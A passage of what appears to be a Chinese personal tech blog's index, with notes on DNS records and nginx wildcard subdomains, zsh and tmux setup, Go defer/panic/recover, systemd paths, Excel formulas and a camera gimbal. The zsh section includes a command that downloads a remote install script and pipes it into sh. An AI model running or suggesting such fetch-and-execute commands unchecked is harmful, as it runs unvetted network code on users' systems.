可以让直接输入网址登陆网站的用户输入简洁的网址即可访问网站。\n\n<!-- more -->\n\n##### 1.3 域名类型\n\n![1](nginx泛域名解析/5.png)\n\n+ 无论记录类型为啥, 主机记录都填写 xxxxx.liuvv.com\n+ 主机记录就是域名前缀，常见用法有：\n  + www：解析后的域名为 `www.liuvv.com`\n  + @：直接解析主域名 `liuvv.com`\n  + \\*：泛解析，匹配其他所有域名 `*.liuvv.com`\n  \n+ 记录类型的含义是什么？\n\n  + **A 记录：**地址记录，用来指定域名的 IPv4 地址（例如`8.8.8.8`），如果需要将域名指向一个 IP 地址，就需要添加 A 记录。\n\n  + **CNAME 记录：** 如果需要将域名指向另一个域名，再由另一个域名提供 IP 地址，就需要添加 CNAME 记录。(github page 就是用的这种)\n\n  + **NS 记录：**域名服务器记录，如果需要把子域名交给其他 DNS 服务商解析，就需要添加 NS 记录。\n\n  + **AAAA 记录：**用来指定主机名（或域名）对应的 IPv6 地址（例如 `ff06:0:0:0:0:0:0:c3`）记录。\n\n  + **MX 记录：**如果需要设置邮箱，让邮箱能收到邮件，就需要添加 MX 记录。\n\n  + **TXT 记录：**如果希望对域名进行标识和说明，可以使用 TXT 记录，绝大多数的 TXT 记录是用来做 SPF 记录（反垃圾邮件）。\n\n  + **SRV 记录：**SRV 记录用来标识某台服务器使用了某个服务，常见于微软系统的目录管理。主机记录处格式为：服务的名字.协议的类型。例如： `_sip._tcp`。\n\n  + **隐、显性 URL 记录：**将一个域名指向另外一个已经存在的站点，就需要添加 URL 记录。\n\n\n+ 记录值如何填写？\n\n  + **A 记录：**填写您服务器 IP，如果您不知道，请咨询您的空间商。\n\n  + **CNAME 记录：**填写空间商给您提供的域名，例如：`2.com`。\n\n  + **MX 记录：**填写您邮件服务器的 IP 地址或企业邮箱给您提供的域名，如果您不知道，请咨询您的邮件服务提供商。\n\n  + **AAAA 记录：**不常用，解析到 IPv6 的地址。\n\n  + **NS记录：**不常用，系统默认添加的两个 NS 记录请不要修改。NS 向下授权，填写 DNS 域名，例如：`ns3.dnsv3.com`。\n\n  + **TXT 记录：**记录值并没有固定的格式，不过大部分情况下，TXT 记录是用来做 SPF 反垃圾邮件的。最典型的 SPF 格式的 TXT 记录例子为 “`v=spf1 a mx ~all`”，表示只有这个域名的 A 记录和 MX 记录中的 IP 地址有权限使用这个域名发送邮件。\n\n  + **SRV 记录：**记录值格式为：优先级 权重 端口 主机名。例如：`0 5 5060 sipserver.example.com` 。\n\n  + **隐、显性 URL 记录：**记录值为必须为整的地址（必须带有协议、域名，可以包含端口号和资源定位符）。\n\n+ TTL如何填写\n\n  TTL即 Time To Live，缓存的生存时间。指地方 DNS 缓存您域名记录信息的时间，缓存失效后会再次到 DNSPod 获取记录值。我们默认的 600 秒是最常用的，不用修改。\n\n  - 600（10分钟）：建议正常情况下使用 600。\n\n  - 60（1分钟）：如果您经常修改 IP，修改记录一分钟即可生效。长期使用 60，解析速度会略受影响。\n\n  - 3600（1 小时）：如果您 IP 极少变动（一年几次），建议选择 3600，解析速度快。如果要修改 IP，提前一天改为 60，即可快速生效。\n\n    \n\n\n### 2. 域名配置\n\n##### 2.1 配置泛解析\n\n去域名提供商那里先配置一个泛解析地址,记录类型为A.域名指向一个IPv4地址.主机记录设置为*.记录值填写服务器公网Ip地址.\n\n配置好后稍微等待一下,然后访问这个域名.可以随意输入任何二级域名,访问到的都应该是顶级域名的内容.我这里访问结果总是Nginx的默认页面.\n\n![1](nginx泛域名解析/2.png)\n\n\n\n##### 2.2 nginx server_name\n\nnginx http模块 server模块的 `server_name`指令主要用于配置基于名称的虚拟主机.匹配顺序不同结果不同.\n\na. 精准的server_name配置,如:\n\n```\nserver_name liuvv.com www.liuvv.com;\n```\n\nb. 以通配符*开始的字符串:\n\n```\nserver_name *.liuvv.com;\n```\n\nc. 以通配符*结束的字符串:\n\n```\nserver_name www.*;\n```\n\nd. 配置正则表达式:\n\n```\nserver_name ~^(?.+)\\.liuvv\\.com$;\n```\n\n匹配顺序由上至下,只要有一项匹配以后就会停止搜索.使用时要注意这个顺序\n\n\n\n##### 2.3 绑定子域名到不同目录\n\n通过匹配subdomain, 在下面的可以通过$subdomain这个变量获取当前子域名称。\n\n```nginx\nserver {\n        listen 80 default_server;\n        listen [::]:80 default_server;\n\n        server_name  ~^(?<subdomain>.+)\\.liuvv\\.com$;\n        root /home/levonfly/www/$subdomain;\n        index index.html;\n\n        location / {\n                try_files $uri $uri/ =404;\n        }\n\n}\n```\n\n\n\n\n![1](nginx泛域名解析/3.png)\n\n\n\n![1](nginx泛域名解析/4.png)\n\n\n\n##### 2.4 绑定子域名到不同目录(多个配置文件)\n\n![1](nginx泛域名解析/6.png)\n\n\n\n\n\n### 3. 参考资料\n\n+ [Nginx 泛解析配置请求映射到多端口实现二级域名访问](https://www.cnblogs.com/summit7ca/p/6974215.html)\n+ http://www.ruanyifeng.com/blog/2016/06/dns.html\n+ https://cloud.tencent.com/document/product/302/3468","tags":["nginx"],"categories":["nginx"]},{"title":"iterm2安装zsh配置常用插件","url":"%2Fp%2F6600d67c.html","content":"\n直接看效果图\n\n![1](iterm2_zsh配置/3.png)\n\n![1](iterm2_zsh配置/2.png)\n\n\n\n<!-- more -->\n\n# 1. 安装\n\n### 1.1 安装 ohmyzsh\n\n https://github.com/ohmyzsh/ohmyzsh\n\n注意安装会覆盖 `.zshrc`, 提前备份下\n\n```\nsh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n```\n\n有效配置\n\n```bash\n export ZSH=\"/Users/liuwei/.oh-my-zsh\"\n ZSH_THEME=\"robbyrussell\"\n plugins=(git)\n source $ZSH/oh-my-zsh.sh\n```\n\n\n\n### 1.2  安装主题 powerlevel10k\n\nhttps://github.com/romkatv/powerlevel10k\n\n```bash\ngit clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k\n\n# 设置主题  ~/.zshrc\nZSH_THEME=\"powerlevel10k/powerlevel10k\" \n```\n\n\n\n主题配置\n\n```bash\nPOWERLEVEL9K_MODE='nerdfont-complete'\nZSH_THEME=\"powerlevel9k/powerlevel9k\"\nPOWERLEVEL9K_CONTEXT_TEMPLATE='%n'\nPOWERLEVEL9K_CONTEXT_DEFAULT_FOREGROUND='white'\nPOWERLEVEL9K_PROMPT_ON_NEWLINE=true\nPOWERLEVEL9K_MULTILINE_LAST_PROMPT_PREFIX=\"%F{014}\\u2570%F{cyan}\\uF460%F{073}\\uF460%F{109}\\uF460%f \"\nPOWERLEVEL9K_SHORTEN_DIR_LENGTH=1\nPOWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(os_icon context battery dir vcs)\nPOWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=(status time dir_writable ip public_ip ram load background_jobs)\n```\n\n\n\n### 1.3 安装字体\n\n```bash\n# 下载推荐字体\nhttps://github.com/romkatv/powerlevel10k#meslo-nerd-font-patched-for-powerlevel10k\n```\n\n也可选择其他字体安装\n\n```bash\n# powerline\ngit clone https://github.com/powerline/fonts\n./install.sh\n\n# awesome-terminal-font\ngit clone https://github.com/gabrielelana/awesome-terminal-fonts\n打开build文件夹双击安装\n\n# nerd-fonts, 装这个即可\nhttps://github.com/ryanoasis/nerd-fonts/\n\nbrew tap homebrew/cask-fonts\nbrew cask install font-hack-nerd-font\n```\n\n\n\n然后在iterm2里面，把字体改成后缀为powerline的字体就行了\n\n![1](iterm2_zsh配置/1.png)\n\n\n\n# 2. 插件\n\n### 2.1 git\n\n```bash\n#.zshrc\nplugins=(git)\n```\n\n### 2.2 自动补充\n\nhttps://github.com/zsh-users/zsh-autosuggestions\n\n```bash\ngit clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions\n\n#.zshrc\nplugins=(zsh-autosuggestions)\n```\n\n### 2.3 语法高亮\n\nhttps://github.com/zsh-users/zsh-syntax-highlighting\n\n```bash\ngit clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting\n\n#.zshrc\nplugins=(zsh-syntax-highlighting)\n```\n\n\n\n# 3. 配色\n\n### 3.1 配色项目\n\n```bash\nhttps://github.com/dracula/dracula-theme/ # 选用的这个!!!好看!!!支持各种终端\nhttps://github.com/mbadolato/iTerm2-Color-Schemes # 这上面好多, 慢慢挑\nhttps://github.com/MartinSeeler/iterm2-material-design \n```\n\n### 3.2 安装dracula\n\nhttps://github.com/dracula/iterm\n\n```bash\ngit clone https://github.com/dracula/iterm.git\n\n#Activating theme\niTerm2 > Preferences > Profiles > Colors Tab\nOpen the Color Presets... drop-down in the bottom right corner\nSelect Import... from the list\n\nSelect the Dracula.itermcolors file\nSelect the Dracula from Color Presets...\n```\n\n\n\n# 4. 遇到的问题\n\n### 4.1 图案不显示\n\n```bash\nPOWERLEVEL9K_MODE='nerdfont-complete' #这句话一定要在下面source之前\nsource $ZSH/oh-my-zsh.sh\n```\n\n\n\n# 5. 参考资料\n\n+ [打造 Mac 下高颜值好用的终端环境](https://blog.biezhi.me/2018/11/build-a-beautiful-mac-terminal-environment.html)\n\n+ https://medium.com/@Clovis_app/configuration-of-a-beautiful-efficient-terminal-and-prompt-on-osx-in-7-minutes-827c29391961\n\n\n","tags":["iterm2"],"categories":["iterm2"]},{"title":"iterm2上tmux和oh_my_tmux的使用","url":"%2Fp%2F29f1e79c.html","content":"\ntmux是一款优秀的终端复用软件，它比Screen更加强大。 tmux之所以受人们喜爱，主要得益于以下功能：\n\n- 丝滑分屏（split），虽然iTem2也提供了横向和竖向分屏功能，但这种分屏功能非常拙劣，完全等同于屏幕新开一个窗口，新开的pane不会自动进入到当前目录，也没有记住当前登录状态。这意味着如果我ssh进入到远程服务器时，iTem2新开的pane中，我依然要重新走一遍ssh登录的老路（omg）。tmux就不会这样，tmux窗口中，新开的pane，默认进入到之前的路径，如果是ssh连接，登录状态也依旧保持着，如此一来，我就可以随意的增删pane，这种灵活性，好处不言而喻。\n\n- 保护现场（attach），即使命令行的工作只进行到一半，关闭终端后还可以重新进入到操作现场，继续工作。对于ssh远程连接而言，即使网络不稳定也没有关系，掉线后重新连接，可以直奔现场，之前运行中的任务，依旧在跑，就好像从来没有离开过一样；特别是在远程服务器上运行耗时的任务，tmux可以帮你一直保持住会话。如此一来，你就可以随时随地放心地进行移动办公，只要你附近的计算机装有tmux（没有你也可以花几分钟装一个），你就能继续刚才的工作。\n\n<!-- more -->\n\n+ 上下效果图\n\n![1](tmux/1.png)\n\n![1](tmux/2.png)\n\n\n\n# 1. 安装\n\n### 1.1 tmux 安装\n\n```bash\nbrew install tmux #mac\n\napt-get install tmux #linux\n```\n\n\n\n### 1.2 oh my tmux 安装\n\n+ https://github.com/gpakosz/.tmux\n\n```bash\ncd\ngit clone https://github.com/gpakosz/.tmux.git\nln -s -f .tmux/.tmux.conf\ncp .tmux/.tmux.conf.local .\n```\n\n以后配置修改   ~/.tmux.conf.local 即可. \n\n\n\n# 2. tmux 使用\n\ntmux使用C/S模型构建，主要包括以下单元模块：\n\n- server服务器。输入tmux命令时就开启了一个服务器。\n- session会话。一个服务器可以包含多个会话\n- window窗口。一个会话可以包含多个窗口。\n- pane面板。一个窗口可以包含多个面板。\n\n我习惯一个项目用一个 session, 一个工作区用一个 window, 快捷操作开始一个 panel. 如果刚开始记不住 tmux的操作, 一定多练习, 一定多用, 你会发现离不开它了.\n\n\n\n### 2.1 tmux 命令\n\n```bash\ntmux ls # 查看当前所有的session\n\ntmux\t# 新建一个无名称的会话, 可以用$再改名\n\ntmux new -s demo # 新建一个名称为demo的会话, \n\ntmux attach -t session_name # 连接之前退出的session\n\ntmux attach-session  # 快速进入 session\n\ntmux kill-server  #关闭服务器，所有的会话都将关闭\n```\n\n\n\n### 2.2 session操作\n\n+ 新建 <prefix> C-c\n\n+ 删除  :kill-session  或  tmux ls 以后 tmux kill-session -t 名字\n\n+ 选择 s\n\n+ 重命名 $\n\n+ 退出  d\n\n\n\n### 2.3 window 操作\n\n+ 新建   c\n+ 关闭  ctrl+d 或   &\n+ 列表  w   可切到其他 session\n\n+ 重命名  ,\n\n+ 跳跃  0-9\n+ 向左 C-h  或   n\n+ 向右 C-l  或   p\n\n\n\n### 2.4 panel 操作\n\n+ 新建上下   - 或  \"\n\n+ 新建左右   _  或 %\n\n+ 关闭  ctrl+d  或 x\n\n+ 切换： 空格键\n\n+ 移动    hjkl 键 或 上下左右键\n\n+ 最大化  z\n\n+ 变窗口  !   如果只是临时变 window, 用+\n\n\n\n### 2.5 Oh My Tmux 操作\n\n```bash\n#自动把 ctrl + a 当做第二个前缀\n\n<prefix> m #切换鼠标开启状态\n\n<prefix> e #自动打开配置\n\n<prefix> r # 刷新配置\n\n<prefix> C-c  #新建一个 Session\n\n<prefix> - 和 <prefix> _  #水平和垂直分屏\n\n<prefix> + #让当前 panel 成为 window, 注意 再一次还能回到 panel\n```\n\n\n\n# 3. 配置\n\n### 3.1 tmux 配置\n\n```bash\ntmux source-file ~/.tmux.conf # 刷新配置\n\nset-option -g prefix2 `  # 设置一个不常用的`键作为指令前缀，按键更快些, 建议用 ctrl+a\n\nset -g mouse on  # 最好关掉, 要不然影响iterm2自带鼠标选中\n```\n\n\n\n### 3.2 tmux 插件\n\n+ tpm 插件管理\n\n  ```bash\n  git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm\n  ```\n\n  配置参考:\n\n  ```bash\n  set -g @tpm_plugins '          \\\n    tmux-plugins/tpm             \\\n  '\nrun '~/.tmux/plugins/tpm/tpm'\n  ```\n  \n  安装:\n  \n  ```bash\n  Installing plugins\n  1. Add new plugin to ~/.tmux.conf with set -g @plugin '...'\n  ```\n2. Press prefix + I (capital i, as in Install) to fetch the plugin.\n\nYou're good to go! The plugin was cloned to ~/.tmux/plugins/ dir and sourced.\n  ```\n\n+ tmux-resurrect 保存session\n\n  ```bash\n  <prefix> ctrl + s #save\n  <prefix> ctrl + r #load\n  ```\n\n\n\n### 3.3 修改Oh My Tmux 配置\n\n  ```bash\n  tmux_conf_new_window_retain_current_path=true  #window保持路径\n  tmux_conf_new_pane_reconnect_ssh=true  #重新连接 ssh\n  tmux_conf_new_session_prompt=true  #新建 session 输入名字\n\n  #左边状态栏精简\n  tmux_conf_theme_status_left=' ❐ #S '  \n  # 右边显示天气, 和week of year\n  tmux_conf_theme_status_right='#{prefix}#{pairing}#{synchronized} | %Y-%m-%d | %H:%M:%S | w-#(echo $(((%j/7)+(%j%7>0)))) , %a'\n  # 前缀显示emoji\n  tmux_conf_theme_prefix='🍎 🍐 🍊 🍋 🍌 🍉 '\n  # 状态栏放到上面\n  set -g status-position top\n\n------------------------------------------------------------------\n\n  # Ctrl+Shift+Left  window向左(不需要prefix), Ctrl+Shift+Left window向右(不需要prefix)\n  #bind-key -n C-S-Left swap-window -t -1 \n  #bind-key -n C-S-Right swap-window -t +1 \n  #链接: https://superuser.com/a/552493\n  bind-key -n C-S-Left swap-window -t -1\\; select-window -t -1\n  bind-key -n C-S-Right swap-window -t +1\\; select-window -t +1\n\n  # 插件相关, 参考3.2安装插件步骤\n  set -g status-right 'Continuum status: #{continuum_status}'\n  set -g @continuum-save-interval '10'\n  set -g @continuum-restore 'on'\n\n  set -g @tpm_plugins '    \\\n  tmux-plugins/tpm            \\\n  tmux-plugins/tmux-open \\\n  tmux-plugins/tmux-yank\t\\\n  tmux-plugins/tmux-sensible  \\\n  tmux-plugins/tmux-resurrect  \\\n  tmux-plugins/tmux-continuum  \\\n  '\n  run '~/.tmux/plugins/tpm/tpm'\n  ```\n\n  \n\n# 4. tmux 遇到的问题\n\n### 4.1 off, 鼠标无法滚动\n\nIn iTerm2 all you need to do is to go to \n\nPreferences > Profile > Terminal and check ‘Save lines to scrollback when an app status bar is present’.\n\n### 4.2 on, 鼠标无法智能选中\n\n快速关闭, prefix+m\n\n### 4.3 无论off, on  鼠标点击文件不是默认 app 打开\n\nhttps://stackoverflow.com/a/56715244/7062454\n\n自己强答一题: 先退出 tmux seesion, 用鼠标点击通过默认 app 打开, 再进入 tmux session 就可以了\n\n### 4.4 鼠标无法滚动\n\n+ 重置iterm2\n\n  删除app后, 清理一下配置\n\n  ```bash\n  rm ~/Library/Application\\ Support/iTerm2\n  rm ~/Library/Preferences/com.googlecode.iterm2.*\n  ```\n\n+ 重置 oh my tmux\n\n  ```bash\n  #出问题, 大概率.tmux.conf.local\n  ```\n\n\n\n# 5. 参考资料\n\n+ http://louiszhai.github.io/2017/09/30/tmux/\n\n","tags":["tmux"],"categories":["iterm2"]},{"title":"golang的defer,panic和recover","url":"%2Fp%2Fc0441565.html","content":"\n每次被 `defer`,`panic`和`recover` 坑的死去活来, 今天有时间来整理一下.\n\n<!-- more -->\n\n# 1. defer\n\n### 1.1 匿名返回值不会修改, 有名 ret 方式才会修改\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tfmt.Println(\"a return:\", a())\n}\n\nfunc a() int {\n\tvar i int //defer改的这个值,不是返回值\n\tdefer func() {\n\t\ti++\n\t\tfmt.Println(\"a defer2:\", i)\n\t}()\n  \n\tdefer func() {\n\t\ti++\n\t\tfmt.Println(\"a defer1:\", i)\n\t}()\n  \n\treturn i\n}\n\n// 打印结果为 a defer1: 1\n// 打印结果为 a defer2: 2\n// 打印结果为 a return: 0\n//  a()int 函数的返回值没有被提前声明，其值来自于其他变量的赋值，而defer中修改的也是其他变量（其实该defer根本无法直接访问到返回值），因此函数退出时返回值并没有被修改。\n\n\n\npackage main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tfmt.Println(\"b return:\", b())\n}\n\nfunc b() (i int) {\n\tdefer func() {\n\t\ti++\n\t\tfmt.Println(\"b defer2:\", i)\n\t}()\n\tdefer func() {\n\t\ti++\n\t\tfmt.Println(\"b defer1:\", i)\n\t}()\n\treturn i // 或者直接 return 效果相同\n}\n\n// 打印结果为 b defer1: 1\n// 打印结果为 b defer2: 2\n// 打印结果为 b return: 2\n// b()(i int) 函数的返回值被提前声明，这使得defer可以访问该返回值，因此在return赋值返回值 i 之后，defer调用返回值 i 并进行了修改，最后致使return调用RET退出函数后的返回值才会是defer修改过的值。\n```\n\n\n\n### 1.2. defer 推迟的是函数体执行\n\ndefer声明时会先计算确定参数的值，defer推迟执行的仅是其函数体。\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tdefer P(time.Now())\n\ttime.Sleep(1e9) // 1s\n\tfmt.Println(\"1\", time.Now())\n}\nfunc P(t time.Time) {\n\tfmt.Println(\"2\", t) // 此处还是老的值\n\tfmt.Println(\"3\", time.Now())\n}\n\n/*\n1 2020-06-30 20:27:58.893326 +0800 CST m=+1.000510368\n2 2020-06-30 20:27:57.892902 +0800 CST m=+0.000117140\n3 2020-06-30 20:27:58.89402 +0800 CST m=+1.001204598\n*/\n\n```\n\n\n\n### 1.3 先 defer 再 panic, 最后 panic 收尸\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc calc(index string, a, b int) int {\n\tret := a + b\n\tfmt.Println(index, a, b, ret)\n\treturn ret\n}\n\nfunc main() {\n\ta := 1\n\tb := 2\n\tdefer calc(\"1\", a, calc(\"10\", a, b))\n\ta = 0\n\tdefer calc(\"2\", a, calc(\"20\", a, b))\n\tb = 1\n\tpanic(\"触发异常\")\n}\n\n/*\n10 1 2 3\n20 0 2 2\n2 0 2 2\n1 1 3 4\npanic: 触发异常\n*/\n\n```\n\n\n\n### 1.4 调用os.Exit不会执行defer\n\n当发生panic时，所在goroutine的所有defer会被执行，但是当调用os.Exit()方法退出程序时，defer并不会被执行。\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc deferExit() {\n\tdefer func() {\n\t\tfmt.Println(\"defer\")\n\t}()\n\tos.Exit(0)\n}\nfunc main() {\n\tdeferExit() // 什么也不输出\n}\n```\n\n\n\n### 1.5 return和 defer 顺序\n\n+ 多个defer的执行顺序为“后进先出”。\n\n+ 所有函数在执行RET返回指令之前，都会先检查是否存在defer语句，若存在则先逆序调用defer语句进行收尾工作再退出返回。\n\n+ return其实应该包含前后两个步骤：\n\n  + 第一步是给返回值赋值（若为有名返回值则直接赋值，若为匿名返回值则先声明再赋值）。\n\n  + 第二步是调用RET返回指令并传入返回值，而RET则会检查defer是否存在，若存在就先逆序插播defer语句，最后RET携带返回值退出函数。\n\n  ‍‍因此，‍‍defer、return、返回值三者的执行顺序应该是：return最先给返回值赋值；接着defer开始执行一些收尾工作；最后RET指令携带返回值退出函数。\n\n\n\n# 2. panic\n\n### 2.1 截获 panic\n\n+ defer 和 recover 配合, 并且先声明defer\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tdefer func() { // 必须要先声明defer，否则不能捕获到panic异常\n\t\tfmt.Println(\"a\")\n\t\tif err := recover(); err != nil {\n\t\t\tfmt.Println(err)\n\t\t}\n\t\tfmt.Println(\"b\")\n\t}()\n\n\tpanic(\"异常信息\")\n\n\tfmt.Println(\"c\")\n}\n\n```\n\n\n\n### 2.2 panic 传递\n\npanic 会一直传递, 导致主 gorouting 奔溃\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc testPanic2() {\n\tpanic(\"testPanic panic2\")\n}\n\nfunc testPanic1() {\n\tgo testPanic2()\n}\n\nfunc main() {\n\tfmt.Println(\"begin\")\n\tgo testPanic1()\n\tfor {\n\t\ttime.Sleep(time.Second)\n\t}\n}\n\n\n/*\nbegin\npanic: testPanic panic2\n\ngoroutine 5 [running]:\nmain.testPanic2()\n*/\n```\n\n\n\n# 3. recover\n\n### 3.1 截获 panic 只能在一个层\n\n外层的 recover 能捕捉里层的 panic吗?  不能\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tdefer func() {\n\t\tif err := recover(); err != nil {\n\t\t\tfmt.Println(err)\n\t\t}\n\t}()\n\n\tgo func() {\n\t\tpanic(\"falut1\")\n\t}()\n\n\ttime.Sleep(time.Second)\n}\n\n/*\npanic: falut1\n\ngoroutine 18 [running]:\nmain.main.func2()\n        /Users/liuwei/golang/src/golangTest/suanfa/main.go:16 +0x39\ncreated by main.main\n        /Users/liuwei/golang/src/golangTest/suanfa/main.go:15 +0x71\nexit status 2\n*/\n```\n\n","tags":["golang"],"categories":["golang"]},{"title":"/etc/systemd/system和/lib/systemd/system的区别","url":"%2Fp%2Fc1403091.html","content":"\n\n\n### 1. 区别\n\n##### 1.1 [/usr]/lib/systemd/system/  (软件包安装的单元)\n\nThe expectation is that `/lib/systemd/system` is a directory that should only contain systemd unit files which were put there by the package manager (YUM/DNF/RPM/APT/etc).\n\n##### 1.2 /etc/systemd/system/(系统管理员安装的单元, 优先级更高)\n\nFiles in `/etc/systemd/system` are manually placed here by the operator of the system for ad-hoc software installations that are not in the form of a package. This would include tarball type software installations or home grown scripts.\n\n### 2. 优先级\n\nsystemd的使用大幅提高了系统服务的运行效率, 而unit的文件位置一般主要有三个目录：\n\n```\n       Table 1.  Load path when running in system mode (--system).\n       ┌────────────────────────┬─────────────────────────────┐\n       │Path                    │ Description                 │\n       ├────────────────────────┼─────────────────────────────┤\n       │/etc/systemd/system     │ Local configuration         │\n       ├────────────────────────┼─────────────────────────────┤\n       │/run/systemd/system     │ Runtime units               │\n       ├────────────────────────┼─────────────────────────────┤\n       │/lib/systemd/system     │ Units of installed packages │\n       └────────────────────────┴─────────────────────────────┘\n```\n\n<!-- more -->\n\n这三个目录的配置文件优先级依次从高到低，如果同一选项三个地方都配置了，优先级高的会覆盖优先级低的。 \n\n系统安装时，默认会将unit文件放在`/lib/systemd/system`目录。如果我们想要修改系统默认的配置，比如`nginx.service`，一般有两种方法：\n\n1. 在`/etc/systemd/system`目录下创建`nginx.service`文件，里面写上我们自己的配置。\n2. 在`/etc/systemd/system`下面创建`nginx.service.d`目录，在这个目录里面新建任何以.conf结尾的文件，然后写入我们自己的配置。推荐这种做法。\n\n`/run/systemd/system`这个目录一般是进程在运行时动态创建unit文件的目录，一般很少修改，除非是修改程序运行时的一些参数时，即Session级别的，才在这里做修改。\n\n\n\n参考资料:\n\n+ https://unix.stackexchange.com/questions/206315/whats-the-difference-between-usr-lib-systemd-system-and-etc-systemd-system\n+ https://wiki.archlinux.org/index.php/Systemd","tags":["systemd"],"categories":["系统"]},{"title":"excel制作记账本功能","url":"%2Fp%2F34a34835.html","content":"\n想用excel 实现一个简单的记账表，如下图：\n\n![1](excel制作记账本功能/1.png)\n\n<!-- more -->\n\n\n\n\n### 1. 第一行到当前行求和\n\n`=SUM(INDIRECT(\"A1:A\"&ROW()))`\n\n### 2. 除了第一列选中整列\n\n选中整列就是双击整列\n\n除了第一列不选, 那么在第二列, cmd+shift+↓, 如果有数据↓按两次\n\n### 3. 公式应用整列\n\n选中整列 ctrl+d   应用所有样式\n\n### 4. IF 函数\n\n=IF(1>2,\"判断真\",\"判断假\")\n\n### 5. 限制数字\n\n选中列, 右键数据验证, 开启\n\n### 6. 删除数据, 不删除公式\n\n软件支持，在线文档不支持。\n\n### 7. 如果前面有值, 后面自动计算,  否则显示空\n\n+ 总金额\n\n   `=IF(ISBLANK(C4),\"\",SUM(INDIRECT(\"C4:C\"&ROW()))) `  // C4是第一个数据, 对下面的列应用样式\n\n\n","tags":["excel"],"categories":["个人记录"]},{"title":"智云云鹤2_crane2教程","url":"%2Fp%2F3bad91c1.html","content":"\n\n\n### 1. 安装\n\n+ 安装电池\n+ 拧上三脚架\n\n### 2. 平衡\n\n调节平衡之前需要先认清三个轴:\n\n+ 俯仰轴   相机的右侧的那个圆圈(转动改变角度)\n\n+ 横滚轴   后方写着智云字体的那个圆圈(貌似不会转动,倾斜改变角度)\n\n+ 航向轴   手柄上方的那个圆圈(转动改变角度)\n\n  \n\n##### 2.1 调节平衡\n\n+ 先调节俯仰轴水平, 前后移动快装板, 松手水平后拧紧快装板螺丝\n+ 再调节俯仰轴垂直, 松手垂直后拧紧俯仰轴螺丝\n+ 再调节横滚轴, 松手水平后拧紧横滚轴螺丝\n+ 最后调节航向轴, 把三脚架怼着肚子,松手水平后拧紧航向轴螺丝\n\n<!-- more -->\n\n### 3. APP\n\n+ ZY Play(可以控制crane2)\n+ 智云掌上助手 (貌似只能看角度)\n\n\n\n#### 4. SONY\n\n+ 连接相机线, 先开稳定器, 再开相机\n+ camera修改相机为 sony, false(不为相机供电, 对给相机备电池)\n+ 电源键录像, 确认键拍照\n+ 跟焦不支持,可以用外置伺服跟焦器(没啥卵用)\n\n\n\n### 5. 模式\n\n##### 5.1 PF 左右跟随模式 (一直保持水平)===>需要自己控制左右转\n\n+ 俯仰和横滚锁定, 水平方向随着手柄转动\n\n+ 向上和向下改变仰角\n\n##### 5.2 L 全锁定模式 (保持水平和垂直)===>需要自己控制任何方向\n\n+ 三个轴都锁定\n\n+ 向上和向下改变仰角\n\n+ 向左和向右改变朝向\n\n##### 5.3 F 全跟随模式 (水平和垂直都活)===>控制好自己\n\n+ 横滚锁定\n+ 俯仰和朝向随手柄转动\n+ 向左和向右改变横滚角度\n\n##### 5.4 POV 第一视角模式(360度无死角)===>自己转手柄对准(难度高)\n\n+ 上下画圈旋转\n+ 手柄顺时针和逆时针转动\n+ 定器手柄顶端作定向点，手柄末端作转向点\n\n##### 5.5 V 三围梦境模式===>握紧手柄,点按钮翻转\n\n+ 前进/后退中按钮旋转\n+ 向左和向右旋转相机\n+ 即使三维梦境的拍摄效果是画面的顺/逆时针旋转，但实际稳定器的运动轨迹并非是横滚轴，而是航向轴 。\n+ 在拍摄前需注意进行相机调平，尤为是容易被忽略的航向轴调平，以便发挥稳定器的最大功率实现完美拍摄。\n\n\n\n#### 6. 配件\n\n+ 外置伺服跟焦器, 因为sony 不支持跟焦, 可以用作物理跟焦, 已挂闲鱼\n+ 鳞甲监视器, 需要另购买配件(蛇管怪手), 已挂闲鱼","tags":["photo"],"categories":["摄影"]},{"title":"pr入门教程笔记","url":"%2Fp%2Fe24658ca.html","content":"\n\n\n\n### 0. 安装\n\n+ windows\n\n+ mac\n\n### 1. 基础操作\n\n##### 1.1 软件\n\n+ 新建项目\n+ 窗口->工作区->重置\n+ 首选项->自动保存\n\n<!-- more -->\n\n##### 1.2 导入\n\n+ 双击\n+ 右键->导入\n+ 拖到文件夹->导入(提前归类好文件夹资源)\n\n##### 1.3 序列\n\n+ 手动新建序列, 如1080P 25fps….\n+ 直接通过资源来创建序列\n+ v1,v2,v3 视频段,  a1,a2,a3 音频段\n+ 视频可以开关小眼睛关闭, 音频可以m静音\n+ 可以上下推拉, 调整序列段的宽度\n+ 速度/\b持续时间 可制作升格降格, 序列前面会出现fx标识, (拍摄100ps, 降低到25ps)\n+ 序列可以拖动并入之前的系列\n\n##### 1.4 操作\n\n+ M标记 -> 剪刀裁剪 -> 波纹删除 \n+ alt 按序列段 -> 拖到 -> 复制\n\n##### 1.5 转场\n\n+ 效果 -> 视频过渡 -> 拖动 -> 放在两个段中间\n+ 常用的是 交叉溶解\n\n##### 1.6 音效\n\n+ 点中音乐段, 左上角调节级别(控制音量, 负无穷到正无穷)\n+ 点击前面的小闹钟, 然后再K帧, 可以制作音量的变化\n\n##### 1.7 字幕\n\n+ 窗口 -> 字幕 -> 新建字幕\n\n##### 1.8 导出\n\n+ 文件 -> 导出 -> H.264(mp4格式)\n+ 通过调节比特率/最大比特率 可以降低文件的大小\n\n### 2. 快捷键\n\n+ v 选择\n+ 